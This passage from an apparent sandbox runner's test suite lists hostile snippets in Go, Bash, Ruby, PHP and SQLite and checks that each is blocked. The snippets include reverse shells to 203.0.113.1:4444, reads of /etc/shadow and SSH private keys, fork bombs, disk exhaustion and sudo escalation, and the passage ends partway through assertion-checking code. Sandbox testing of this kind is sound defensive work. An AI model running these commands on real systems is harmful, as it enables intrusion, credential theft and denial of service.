    assert: { stdoutExact: "2", exitCode: 0 },
  },
  {
    name: "sqlite / string functions",
    lang: "sqlite3",
    code: `SELECT UPPER('hello') || ' ' || LOWER('WORLD');`,
    assert: { stdoutExact: "HELLO world", exitCode: 0 },
  },
  {
    name: "sqlite / invalid syntax error",
    lang: "sqlite3",
    code: `THIS IS NOT SQL AT ALL;`,
    assert: { failure: true },
  },
  {
    name: "sqlite / multiple result rows",
    lang: "sqlite3",
    code: `CREATE TABLE t(x);\nINSERT INTO t VALUES (1),(2),(3);\nSELECT x FROM t ORDER BY x;`,
    assert: { stdoutContains: "1\n2\n3", exitCode: 0 },
  },
  {
    name: "sqlite / WITH (CTE)",
    lang: "sqlite3",
    code: `WITH nums(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM nums WHERE n < 5)\nSELECT SUM(n) FROM nums;`,
    assert: { stdoutExact: "15", exitCode: 0 },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // GO SECURITY
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "go / security: read /etc/passwd",
    lang: "go",
    code: `package main
import (
  "fmt"
  "os"
)
func main() {
  data, err := os.ReadFile("/etc/passwd")
  if err != nil {
    fmt.Println("blocked")
    os.Exit(1)
  }
  fmt.Print(string(data))
}`,
    assert: { secureNotContains: "root:x" },
  },

  {
    name: "go / security: read /etc/shadow",
    lang: "go",
    code: `package main
import (
  "fmt"
  "os"
)
func main() {
  data, err := os.ReadFile("/etc/shadow")
  if err != nil {
    fmt.Println("blocked")
    os.Exit(1)
  }
  fmt.Print(string(data))
}`,
    assert: { failure: true },
  },

  {
    // Subprocess exec is allowed but must never run as uid=0 (real root)
    name: "go / security: shell command execution via os/exec",
    lang: "go",
    code: `package main
import (
  "fmt"
  "os/exec"
)
func main() {
  out, err := exec.Command("id").Output()
  if err != nil {
    fmt.Println("blocked")
    return
  }
  fmt.Print(string(out))
}`,
    assert: { secureNotContains: "uid=0" },
  },

  {
    name: "go / security: outbound network via net.Dial",
    lang: "go",
    code: `package main
import (
  "fmt"
  "net"
  "os"
)
func main() {
  conn, err := net.Dial("tcp", "8.8.8.8:53")
  if err != nil {
    fmt.Println("blocked")
    os.Exit(1)
  }
  conn.Close()
  fmt.Println("connected")
}`,
    assert: { failure: true },
  },

  {
    // In cgMode=rlimit RLIMIT_AS=6 GB, so a single 512 MB alloc succeeds.
    // Loop-based exhaustion is needed to actually hit the virtual memory limit.
    name: "go / security: memory exhaustion (large slice)",
    lang: "go",
    code: `package main
var chunks [][]byte
func main() {
  for {
    chunks = append(chunks, make([]byte, 256*1024*1024))
  }
}`,
    assert: { failure: true },
  },

  {
    name: "go / security: process exhaustion (fork bomb via goroutines + exec)",
    lang: "go",
    code: `package main
import (
  "os/exec"
  "sync"
)
func main() {
  var wg sync.WaitGroup
  for i := 0; i < 200; i++ {
    wg.Add(1)
    go func() {
      defer wg.Done()
      exec.Command("/bin/sh", "-c", "sleep 10").Start()
    }()
  }
  wg.Wait()
}`,
    assert: { failure: true },
  },

  {
    name: "go / security: write to /etc/hosts",
    lang: "go",
    code: `package main
import (
  "fmt"
  "os"
)
func main() {
  err := os.WriteFile("/etc/hosts", []byte("0.0.0.0 evil.com\n"), 0644)
  if err != nil {
    fmt.Println("blocked")
    os.Exit(1)
  }
  fmt.Println("written")
}`,
    assert: { failure: true },
  },

  {
    name: "go / security: read /proc/self/environ",
    lang: "go",
    code: `package main
import (
  "fmt"
  "os"
  "strings"
)
func main() {
  data, err := os.ReadFile("/proc/self/environ")
  if err != nil {
    fmt.Println("blocked")
    os.Exit(1)
  }
  fmt.Println(strings.ToLower(string(data)))
}`,
    // PATH is normal sandbox env; check for actual secrets instead
    assert: { secureNotContains: "api_key" },
  },

  {
    name: "go / security: read /proc/1/cmdline",
    lang: "go",
    code: `package main
import (
  "fmt"
  "os"
)
func main() {
  data, err := os.ReadFile("/proc/1/cmdline")
  if err != nil {
    fmt.Println("blocked")
    os.Exit(1)
  }
  fmt.Print(string(data))
}`,
    assert: { failure: true },
  },

  {
    name: "go / security: reverse shell attempt",
    lang: "go",
    code: `package main
import (
  "fmt"
  "net"
  "os"
)
func main() {
  conn, err := net.Dial("tcp", "203.0.113.1:4444")
  if err != nil {
    fmt.Println("blocked")
    os.Exit(1)
  }
  conn.Close()
}`,
    assert: { failure: true },
  },

  {
    name: "go / security: disk exhaustion via large file write",
    lang: "go",
    code: `package main
import (
  "fmt"
  "os"
)
func main() {
  f, err := os.Create("/tmp/bomb")
  if err != nil {
    fmt.Println("blocked")
    os.Exit(1)
  }
  defer f.Close()
  buf := make([]byte, 1024*1024) // 1 MB chunk
  for i := 0; i < 2048; i++ {   // attempt 2 GB total
    if _, err := f.Write(buf); err != nil {
      fmt.Println("write stopped")
      os.Exit(1)
    }
  }
  fmt.Println("done")
}`,
    assert: { failure: true },
  },

  {
    name: "go / security: package manager (go get)",
    lang: "go",
    code: `package main
import (
  "fmt"
  "os/exec"
)
func main() {
  out, err := exec.Command("go", "get", "github.com/gorilla/mux").CombinedOutput()
  if err != nil {
    fmt.Println("blocked")
    os.Exit(1)
  }
  fmt.Println(string(out))
}`,
    assert: { failure: true },
  },

  {
    name: "go / security: read /root/.ssh/id_rsa",
    lang: "go",
    code: `package main
import (
  "fmt"
  "os"
)
func main() {
  data, err := os.ReadFile("/root/.ssh/id_rsa")
  if err != nil {
    fmt.Println("blocked")
    os.Exit(1)
  }
  fmt.Print(string(data))
}`,
    assert: { failure: true, secureNotContains: "begin" },
  },

  {
    name: "go / security: dangerous eval via plugin loading",
    lang: "go",
    code: `package main
import (
  "fmt"
  "plugin"
)
func main() {
  _, err := plugin.Open("/etc/passwd")
  if err != nil {
    fmt.Println("blocked")
    os.Exit(1)
  }
}`,
    assert: { failure: true },
  },

  {
    name: "go / security: syscall fork / privilege escalation attempt",
    lang: "go",
    code: `package main
import (
  "fmt"
  "syscall"
)
func main() {
  // Attempt to call setuid(0) to escalate to root
  err := syscall.Setuid(0)
  if err != nil {
    fmt.Println("blocked")
    syscall.Exit(1)
  }
  fmt.Println("escalated")
}`,
    assert: { failure: true },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // BASH SECURITY
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "bash / security: read /etc/passwd",
    lang: "bash",
    code: `cat /etc/passwd 2>/dev/null || echo "blocked"`,
    assert: { secureNotContains: "root:x" },
  },

  {
    name: "bash / security: read /etc/shadow",
    lang: "bash",
    code: `cat /etc/shadow 2>/dev/null && echo "leaked" || echo "blocked"`,
    assert: { stdoutContains: "blocked" },
  },

  {
    name: "bash / security: shell command execution (id)",
    lang: "bash",
    code: `$(id)
echo "user: $(whoami)"`,
    assert: { secureNotContains: "uid=0" },
  },

  {
    name: "bash / security: outbound network via curl",
    lang: "bash",
    code: `curl -s --max-time 3 http://1.1.1.1 2>/dev/null && echo "connected" || echo "blocked"`,
    assert: { stdoutContains: "blocked" },
  },

  {
    name: "bash / security: outbound network via wget",
    lang: "bash",
    code: `wget -q --timeout=3 -O- http://example.com 2>/dev/null && echo "connected" || echo "blocked"`,
    assert: { stdoutContains: "blocked" },
  },

  {
    name: "bash / security: outbound network via nc (netcat)",
    lang: "bash",
    code: `nc -z -w 2 8.8.8.8 53 2>/dev/null && echo "connected" || echo "blocked"`,
    assert: { stdoutContains: "blocked" },
  },

  {
    // bash || fallback always exits 0; verify OOM is triggered correctly
    name: "bash / security: memory exhaustion (yes pipe to head)",
    lang: "bash",
    code: `python3 -c "
chunks=[]
while True: chunks.append(b'x'*256*1024*1024)
" 2>/dev/null && echo "ok" || echo "oom"`,
    assert: { stdoutContains: "oom" },
  },

  {
    // Fork bomb is contained by process limits; bash exits 0 after children die
    name: "bash / security: fork bomb",
    lang: "bash",
    code: `:(){ :|:& };: 2>/dev/null; echo "stopped"`,
    assert: { stdoutContains: "stopped" },
  },

  {
    name: "bash / security: write to /etc/hosts",
    lang: "bash",
    code: `echo "0.0.0.0 evil.com" >> /etc/hosts 2>/dev/null && echo "written" || echo "blocked"`,
    assert: { stdoutContains: "blocked" },
  },

  {
    // PATH in sandbox environ is not a secret; check for actual credentials instead
    name: "bash / security: read /proc/self/environ",
    lang: "bash",
    code: `cat /proc/self/environ 2>/dev/null | tr '\\0' '\\n' | tr '[:upper:]' '[:lower:]' || echo "blocked"`,
    assert: { secureNotContains: "api_key" },
  },

  {
    name: "bash / security: read /proc/1/cmdline",
    lang: "bash",
    code: `cat /proc/1/cmdline 2>/dev/null && echo "ok" || echo "blocked"`,
    assert: { stdoutContains: "blocked" },
  },

  {
    name: "bash / security: reverse shell attempt via bash redirect",
    lang: "bash",
    code: `bash -i >& /dev/tcp/203.0.113.1/4444 0>&1 2>/dev/null && echo "connected" || echo "blocked"`,
    assert: { stdoutContains: "blocked" },
  },

  {
    name: "bash / security: disk exhaustion via dd",
    lang: "bash",
    code: `dd if=/dev/zero of=/tmp/bomb bs=1M count=2048 2>/dev/null && echo "done" || echo "stopped"`,
    assert: { stdoutContains: "stopped" },
  },

  {
    name: "bash / security: read /root/.ssh/id_rsa",
    lang: "bash",
    code: `cat /root/.ssh/id_rsa 2>/dev/null || echo "blocked"`,
    assert: { stdoutContains: "blocked", secureNotContains: "begin" },
  },

  {
    name: "bash / security: privilege escalation via sudo",
    lang: "bash",
    code: `sudo -n id 2>/dev/null && echo "escalated" || echo "blocked"`,
    assert: { stdoutContains: "blocked" },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // RUBY SECURITY
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "ruby / security: read /etc/passwd",
    lang: "ruby",
    code: `begin
  puts File.read("/etc/passwd")
rescue => e
  puts "blocked"
  exit 1
end`,
    assert: { secureNotContains: "root:x" },
  },

  {
    name: "ruby / security: read /etc/shadow",
    lang: "ruby",
    code: `begin
  puts File.read("/etc/shadow")
rescue => e
  puts "blocked"
  exit 1
end`,
    assert: { failure: true },
  },

  {
    name: "ruby / security: shell command execution via system()",
    lang: "ruby",
    code: `result = system("id")
if result.nil?
  puts "blocked"
  exit 1
end`,
    assert: { secureNotContains: "uid=0" },
  },

  {
    name: "ruby / security: outbound network via Net::HTTP",
    lang: "ruby",
    code: `require 'net/http'
begin
  res = Net::HTTP.get(URI('http://1.1.1.1'))
  puts res
rescue => e
  puts "blocked"
  exit 1
end`,
    assert: { failure: true },
  },

  {
    name: "ruby / security: outbound network via open-uri",
    lang: "ruby",
    code: `require 'open-uri'
begin
  puts URI.open('http://example.com').read
rescue => e
  puts "blocked"
  exit 1
end`,
    assert: { failure: true },
  },

  {
    name: "ruby / security: memory exhaustion (large string)",
    lang: "ruby",
    code: `begin
  x = "A" * (512 * 1024 * 1024)
  puts x.length
rescue => e
  puts "oom"
  exit 1
end`,
    assert: { failure: true },
  },

  {
    name: "ruby / security: process exhaustion (fork bomb)",
    lang: "ruby",
    code: `begin
  loop { fork }
rescue => e
  puts "blocked"
  exit 1
end`,
    assert: { failure: true },
  },

  {
    name: "ruby / security: write to /etc/hosts",
    lang: "ruby",
    code: `begin
  File.write("/etc/hosts", "0.0.0.0 evil.com\n")
  puts "written"
rescue => e
  puts "blocked"
  exit 1
end`,
    assert: { failure: true },
  },

  {
    name: "ruby / security: read /proc/self/environ",
    lang: "ruby",
    code: `begin
  puts File.read("/proc/self/environ").downcase
rescue => e
  puts "blocked"
  exit 1
end`,
    // PATH is normal sandbox env; check for actual secrets instead
    assert: { secureNotContains: "api_key" },
  },

  {
    name: "ruby / security: read /proc/1/cmdline",
    lang: "ruby",
    code: `begin
  puts File.read("/proc/1/cmdline")
rescue => e
  puts "blocked"
  exit 1
end`,
    assert: { failure: true },
  },

  {
    // IO.popen with bash redirect exits 0 even when bash fails the TCP connection.
    // Use TCPSocket directly so a connection failure raises and exits non-zero.
    name: "ruby / security: reverse shell via IO.popen",
    lang: "ruby",
    code: `require 'socket'
begin
  TCPSocket.new('203.0.113.1', 4444)
  puts "connected"
rescue => e
  puts "blocked"
  exit 1
end`,
    assert: { failure: true },
  },

  {
    name: "ruby / security: disk exhaustion via large file write",
    lang: "ruby",
    code: `begin
  File.open("/tmp/bomb", "wb") do |f|
    chunk = "A" * (1024 * 1024) # 1 MB
    2048.times { f.write(chunk) } # attempt 2 GB
  end
  puts "done"
rescue => e
  puts "stopped"
  exit 1
end`,
    assert: { failure: true },
  },

  {
    name: "ruby / security: gem install (package manager)",
    lang: "ruby",
    code: `result = system("gem install rails --no-document 2>&1")
unless result
  puts "blocked"
  exit 1
end
puts "installed"`,
    assert: { failure: true },
  },

  {
    name: "ruby / security: read /root/.ssh/id_rsa",
    lang: "ruby",
    code: `begin
  puts File.read("/root/.ssh/id_rsa")
rescue => e
  puts "blocked"
  exit 1
end`,
    assert: { failure: true, secureNotContains: "begin" },
  },

  {
    name: "ruby / security: Kernel.exec for privilege escalation",
    lang: "ruby",
    code: `begin
  Kernel.exec("sudo", "-n", "id")
rescue => e
  puts "blocked"
  exit 1
end`,
    assert: { failure: true },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // PHP SECURITY
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "php / security: read /etc/passwd via file_get_contents",
    lang: "php",
    code: `<?php
$data = @file_get_contents("/etc/passwd");
if ($data === false) {
    echo "blocked\n";
    exit(1);
}
echo $data;`,
    assert: { secureNotContains: "root:x" },
  },

  {
    name: "php / security: read /etc/shadow",
    lang: "php",
    code: `<?php
$data = @file_get_contents("/etc/shadow");
if ($data === false) {
    echo "blocked\n";
    exit(1);
}
echo $data;`,
    assert: { failure: true },
  },

  {
    name: "php / security: shell execution via system()",
    lang: "php",
    code: `<?php
$out = @system("id", $ret);
if ($out === false || $ret !== 0) {
    echo "blocked\n";
    exit(1);
}
echo $out . "\n";`,
    assert: { secureNotContains: "uid=0" },
  },

  {
    name: "php / security: outbound network via file_get_contents HTTP",
    lang: "php",
    code: `<?php
$data = @file_get_contents("http://1.1.1.1");
if ($data === false) {
    echo "blocked\n";
    exit(1);
}
echo $data;`,
    assert: { failure: true },
  },

  {
    name: "php / security: outbound network via fsockopen",
    lang: "php",
    code: `<?php
$fp = @fsockopen("8.8.8.8", 53, $errno, $errstr, 3);
if (!$fp) {
    echo "blocked\n";
    exit(1);
}
fclose($fp);
echo "connected\n";`,
    assert: { failure: true },
  },

  {
    name: "php / security: memory exhaustion (large string allocation)",
    lang: "php",
    code: `<?php
try {
    $x = str_repeat("A", 512 * 1024 * 1024);
    echo strlen($x) . "\n";
} catch (Throwable $e) {
    echo "oom\n";
    exit(1);
}`,
    assert: { failure: true },
  },

  {
    name: "php / security: process exhaustion (pcntl_fork bomb)",
    lang: "php",
    code: `<?php
if (function_exists("pcntl_fork")) {
    while (true) { pcntl_fork(); }
} else {
    echo "pcntl disabled\n";
    exit(1);
}`,
    assert: { failure: true },
  },

  {
    name: "php / security: write to /etc/hosts",
    lang: "php",
    code: `<?php
$r = @file_put_contents("/etc/hosts", "0.0.0.0 evil.com\n", FILE_APPEND);
if ($r === false) {
    echo "blocked\n";
    exit(1);
}
echo "written\n";`,
    assert: { failure: true },
  },

  {
    name: "php / security: read /proc/self/environ",
    lang: "php",
    code: `<?php
$data = @file_get_contents("/proc/self/environ");
if ($data === false) {
    echo "blocked\n";
    exit(1);
}
echo strtolower(str_replace("\0", "\n", $data)) . "\n";`,
    // PATH is normal sandbox env; check for actual secrets instead
    assert: { secureNotContains: "api_key" },
  },

  {
    name: "php / security: read /proc/1/cmdline",
    lang: "php",
    code: `<?php
$data = @file_get_contents("/proc/1/cmdline");
if ($data === false) {
    echo "blocked\n";
    exit(1);
}
echo $data . "\n";`,
    assert: { failure: true },
  },

  {
    name: "php / security: reverse shell via shell_exec",
    lang: "php",
    code: `<?php
$out = @shell_exec("bash -i >& /dev/tcp/203.0.113.1/4444 0>&1 2>&1");
if ($out === null) {
    echo "blocked\n";
    exit(1);
}
echo $out;`,
    assert: { failure: true },
  },

  {
    name: "php / security: disk exhaustion via large file write",
    lang: "php",
    code: `<?php
$chunk = str_repeat("A", 1024 * 1024); // 1 MB
$fp = @fopen("/tmp/bomb", "wb");
if (!$fp) { echo "blocked\n"; exit(1); }
for ($i = 0; $i < 2048; $i++) {
    if (@fwrite($fp, $chunk) === false) {
        echo "stopped\n";
        fclose($fp);
        exit(1);
    }
}
fclose($fp);
echo "done\n";`,
    assert: { failure: true },
  },

  {
    // shell_exec returns the output string even when composer exits non-zero.
    // Use exec() with exit code to detect the actual failure.
    name: "php / security: package manager (composer install)",
    lang: "php",
    code: `<?php
exec("composer require monolog/monolog 2>&1", $output, $ret);
if ($ret !== 0) {
    echo "blocked\n";
    exit(1);
}
echo implode("\n", $output);`,
    assert: { failure: true },
  },

  {
    name: "php / security: read /root/.ssh/id_rsa",
    lang: "php",
    code: `<?php
$data = @file_get_contents("/root/.ssh/id_rsa");
if ($data === false) {
    echo "blocked\n";
    exit(1);
}
echo $data;`,
    assert: { failure: true, secureNotContains: "begin" },
  },

  {
    name: "php / security: eval with file read payload",
    lang: "php",
    code: `<?php
// eval a string that tries to read /etc/passwd
$payload = 'echo @file_get_contents("/etc/passwd");';
eval($payload);`,
    assert: { secureNotContains: "root:x" },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // SQLITE3 SECURITY
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "sqlite3 / security: read /etc/passwd via readfile()",
    lang: "sqlite3",
    code: `SELECT readfile('/etc/passwd');`,
    assert: { secureNotContains: "root:x" },
  },

  {
    // readfile() returns NULL on permission failure (exit 0); use CASE to surface the result
    name: "sqlite3 / security: read /etc/shadow via readfile()",
    lang: "sqlite3",
    code: `SELECT CASE WHEN readfile('/etc/shadow') IS NULL THEN 'blocked' ELSE 'leaked' END;`,
    assert: { stdoutContains: "blocked" },
  },

  {
    name: "sqlite3 / security: shell command via .system dot command",
    lang: "sqlite3",
    code: `.system id`,
    assert: { secureNotContains: "uid=0" },
  },

  {
    name: "sqlite3 / security: shell command via .shell dot command",
    lang: "sqlite3",
    code: `.shell whoami`,
    assert: { secureNotContains: "root" },
  },

  {
    name: "sqlite3 / security: load_extension to execute native code",
    lang: "sqlite3",
    code: `SELECT load_extension('/usr/lib/x86_64-linux-gnu/libsqlite3.so');`,
    assert: { failure: true },
  },

  {
    name: "sqlite3 / security: ATTACH DATABASE /etc/passwd as leak",
    lang: "sqlite3",
    code: `ATTACH DATABASE '/etc/passwd' AS leak;
SELECT * FROM leak.sqlite_master;`,
    assert: { secureNotContains: "root:x" },
  },

  {
    name: "sqlite3 / security: ATTACH DATABASE /etc/shadow as shadow",
    lang: "sqlite3",
    code: `ATTACH DATABASE '/etc/shadow' AS shadow;
SELECT * FROM shadow.sqlite_master;`,
    assert: { failure: true },
  },

  {
    // writefile() returns NULL on permission failure (exit 0); use CASE to surface the result
    name: "sqlite3 / security: write to /etc/hosts via writefile()",
    lang: "sqlite3",
    code: `SELECT CASE WHEN writefile('/etc/hosts', '0.0.0.0 evil.com') IS NULL THEN 'blocked' ELSE 'written' END;`,
    assert: { stdoutContains: "blocked" },
  },

  {
    name: "sqlite3 / security: read /proc/self/environ via readfile()",
    lang: "sqlite3",
    code: `SELECT lower(readfile('/proc/self/environ'));`,
    assert: { secureNotContains: "path=" },
  },

  {
    // readfile() returns NULL on permission failure (exit 0); use CASE to surface the result
    name: "sqlite3 / security: read /proc/1/cmdline via readfile()",
    lang: "sqlite3",
    code: `SELECT CASE WHEN readfile('/proc/1/cmdline') IS NULL THEN 'blocked' ELSE 'leaked' END;`,
    assert: { stdoutContains: "blocked" },
  },

  {
    name: "sqlite3 / security: disk exhaustion via large zeroblob write",
    lang: "sqlite3",
    code: `CREATE TABLE bomb (data BLOB);
INSERT INTO bomb VALUES (zeroblob(1073741824));`,
    assert: { failure: true },
  },

  {
    name: "sqlite3 / security: .import to read arbitrary file",
    lang: "sqlite3",
    code: `.mode csv
CREATE TABLE leak (line TEXT);
.import /etc/passwd leak
SELECT * FROM leak LIMIT 5;`,
    assert: { secureNotContains: "root:x" },
  },

  {
    // readfile() returns NULL on permission failure (exit 0); use CASE to surface the result
    name: "sqlite3 / security: read /root/.ssh/id_rsa via readfile()",
    lang: "sqlite3",
    code: `SELECT CASE WHEN readfile('/root/.ssh/id_rsa') IS NULL THEN 'blocked' ELSE 'leaked' END;`,
    assert: { stdoutContains: "blocked", secureNotContains: "begin" },
  },

  {
    name: "sqlite3 / security: dangerous eval via load_extension with path traversal",
    lang: "sqlite3",
    code: `SELECT load_extension('../../../lib/libdl.so');`,
    assert: { failure: true },
  },

  {
    name: "sqlite3 / security: infinite recursive CTE (memory/cpu exhaustion)",
    lang: "sqlite3",
    code: `WITH RECURSIVE bomb(n) AS (
  SELECT 1
  UNION ALL
  SELECT n + 1 FROM bomb
)
SELECT COUNT(*) FROM bomb;`,
    assert: { failure: true },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // RUNNER API EDGE CASES
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "api / unsupported language returns 400",
    lang: "cobol",
    code: `DISPLAY 'HELLO'`,
    assert: { httpStatus: 400 },
  },
  {
    name: "api / empty code returns 400",
    lang: "python",
    code: ``,
    // Runner rejects empty code with 400 (content validation)
    assert: { httpStatus: 400 },
  },
  {
    name: "api / code with only comments",
    lang: "python",
    code: `# this is a comment\n# nothing to do`,
    assert: { exitCode: 0 },
  },
  {
    name: "api / newline-only code",
    lang: "python",
    code: `\n\n\n`,
    assert: { exitCode: 0 },
  },
  {
    name: "api / unicode in code and output",
    lang: "python",
    code: `# 中文 comment\nprint("α β γ δ ε")`,
    assert: { stdoutContains: "α β γ", exitCode: 0 },
  },
  {
    name: "api / stdin with newlines",
    lang: "python",
    code: `lines = []\nimport sys\nfor l in sys.stdin:\n    lines.append(l.strip())\nprint(len(lines))`,
    stdin: "a\nb\nc\nd\ne",
    assert: { stdoutExact: "5", exitCode: 0 },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // ERROR MESSAGE QUALITY
  // Each test verifies two things:
  //   1. Error messages reference the user's filename (e.g. "main.py"), not a
  //      generic "SyntaxError" or raw assertion crash.
  //   2. Internal sandbox paths (/var/local/lib/isolate/…) are NOT exposed.
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  // ── TypeScript ──────────────────────────────────────────────────────────────

  {
    // Malformed syntax that previously triggered ts-node "Debug Failure" crash.
    // Should now show clean tsc error code (TS1005 etc.), not a stack trace.
    name: "error quality: typescript / syntax error shows TS error codes",
    lang: "typescript",
    code: `function test( {\n  return 1;\n}`,
    assert: { compileError: true, stderrContains: "error TS", secureNotContains: "/var/local" },
  },
  {
    name: "error quality: typescript / compile error references filename",
    lang: "typescript",
    code: `const x: number = "not a number";`,
    assert: { compileError: true, stderrContains: "main.ts", secureNotContains: "/var/local" },
  },
  {
    name: "error quality: typescript / runtime error references filename",
    lang: "typescript",
    code: `const obj: any = null;\nconsole.log(obj.missing);`,
    assert: { failure: true, stderrContains: "main.ts", secureNotContains: "/var/local" },
  },

  // ── Python ──────────────────────────────────────────────────────────────────

  {
    name: "error quality: python / syntax error shows SyntaxError and filename",
    lang: "python",
    code: `def foo(\n    print("x")`,
    assert: { failure: true, stderrContains: "SyntaxError", secureNotContains: "/var/local" },
  },
  {
    name: "error quality: python / runtime error references filename",
    lang: "python",
    code: `print(undefined_var)`,
    assert: { failure: true, stderrContains: "main.py", secureNotContains: "/var/local" },
  },

  // ── JavaScript ──────────────────────────────────────────────────────────────

  {
    name: "error quality: javascript / runtime error references filename",
    lang: "javascript",
    code: `const x = null;\nconsole.log(x.y);`,
    assert: { failure: true, stderrContains: "main.js", secureNotContains: "/var/local" },
  },

  // ── Java ────────────────────────────────────────────────────────────────────

  {
    name: "error quality: java / compile error references filename",
    lang: "java",
    code: `public class Main {\n  public static void main(String[] args) {\n    System.out.println("no semicolon")\n  }\n}`,
    assert: { compileError: true, stderrContains: "Main.java", secureNotContains: "/var/local" },
  },
  {
    name: "error quality: java / runtime error references filename",
    lang: "java",
    code: `public class Main {\n  public static void main(String[] args) {\n    throw new RuntimeException("boom");\n  }\n}`,
    assert: { failure: true, stderrContains: "Main.java", secureNotContains: "/var/local" },
  },

  // ── C ───────────────────────────────────────────────────────────────────────

  {
    name: "error quality: c / compile error references filename",
    lang: "c",
    code: `#include <stdio.h>\nint main() { printf("hello" return 0; }`,
    assert: { compileError: true, stderrContains: "main.c", secureNotContains: "/var/local" },
  },

  // ── C++ ─────────────────────────────────────────────────────────────────────

  {
    name: "error quality: c++ / compile error references filename",
    lang: "c++",
    code: `int main() { cout << "hello" << endl; return 0; }`,
    assert: { compileError: true, stderrContains: "main.cpp", secureNotContains: "/var/local" },
  },

  // ── Go ──────────────────────────────────────────────────────────────────────

  {
    name: "error quality: go / compile error references filename",
    lang: "go",
    code: `package main\nfunc main() { x := 5 }`,
    assert: { compileError: true, stderrContains: "main.go", secureNotContains: "/var/local" },
  },
  {
    name: "error quality: go / runtime panic references filename",
    lang: "go",
    code: `package main\nfunc main() { var s []int; _ = s[0] }`,
    assert: { failure: true, stderrContains: "main.go", secureNotContains: "/var/local" },
  },

  // ── Ruby ────────────────────────────────────────────────────────────────────

  {
    name: "error quality: ruby / runtime error references filename",
    lang: "ruby",
    code: `raise RuntimeError, "test error"`,
    assert: { failure: true, stderrContains: "main.rb", secureNotContains: "/var/local" },
  },

  // ── PHP ─────────────────────────────────────────────────────────────────────

  {
    name: "error quality: php / error references filename",
    lang: "php",
    code: `<?php\nundefined_function_xyz();`,
    assert: { failure: true, stderrContains: "main.php", secureNotContains: "/var/local" },
  },

  // ── Bash ────────────────────────────────────────────────────────────────────

  {
    name: "error quality: bash / error references filename",
    lang: "bash",
    code: `#!/bin/bash\nset -u\necho $UNDEFINED_VAR`,
    assert: { failure: true, stderrContains: "main.sh", secureNotContains: "/var/local" },
  },
];

// ── Runner HTTP client ─────────────────────────────────────────────────────────

async function callRunner(
  language: string,
  code: string,
  stdin = ""
): Promise<{ ok: boolean; status: number; body: ExecuteResponse | null }> {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), TIMEOUT_MS);

  try {
    const res = await fetch(EXECUTE_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        language,
        files: [{ content: code }],
        stdin,
      }),
      signal: ctrl.signal,
    });

    clearTimeout(timer);

    if (!res.ok && res.status === 400) {
      return { ok: false, status: res.status, body: null };
    }

    const body = await res.json() as ExecuteResponse;
    return { ok: res.ok, status: res.status, body };
  } catch (e) {
    clearTimeout(timer);
    throw e;
  }
}

// ── Assertion checker ─────────────────────────────────────────────────────────

interface CheckResult {
  passed: boolean;
  reason?: string;
}

function checkAssertions(
  resp: { ok: boolean; status: number; body: ExecuteResponse | null },
  assert: Assertion
): CheckResult {
  // HTTP status assertion
  if (assert.httpStatus !== undefined) {
    if (resp.status !== assert.httpStatus) {
      return {
        passed: false,
        reason: `Expected HTTP ${assert.httpStatus}, got ${resp.status}`,
      };
    }
    return { passed: true };
  }

  const { body } = resp;
  if (!body) {
    return { passed: false, reason: "No response body" };
  }

  // Compile error — verify compile failed, then also check stderrContains and
  // secureNotContains against compile output (don't early-return yet).
  if (assert.compileError) {
    if (!body.compile || body.compile.code === 0) {
      return {
        passed: false,
        reason: `Expected compile error but got compile.code=${body.compile?.code ?? "missing"}`,
      };
    }
    // Compile failed as expected.
    // Check stderrContains against the combined compile output (stdout + stderr).
    // tsc writes diagnostics to stdout; javac/gcc/go write to stderr.
    // Combining both makes the assertion work for all compilers.
    if (assert.stderrContains !== undefined) {
      const cs = (body.compile.stdout ?? "") + (body.compile.stderr ?? "");
      if (!cs.includes(assert.stderrContains)) {
        const preview = cs.slice(0, 200).replace(/\n/g, "↵");
        return {
          passed: false,
          reason: `compile output does not contain "${assert.stderrContains}". Got: "${preview}"`,
        };
      }
    }
    // Check secureNotContains across all compile output (stdout + stderr) + run output.
    if (assert.secureNotContains !== undefined) {
      const combined = (
        (body.compile.stdout ?? "") + (body.compile.stderr ?? "") +
        (body.run?.stdout ?? "") + (body.run?.stderr ?? "")
      ).toLowerCase();
      if (combined.includes(assert.secureNotContains.toLowerCase())) {
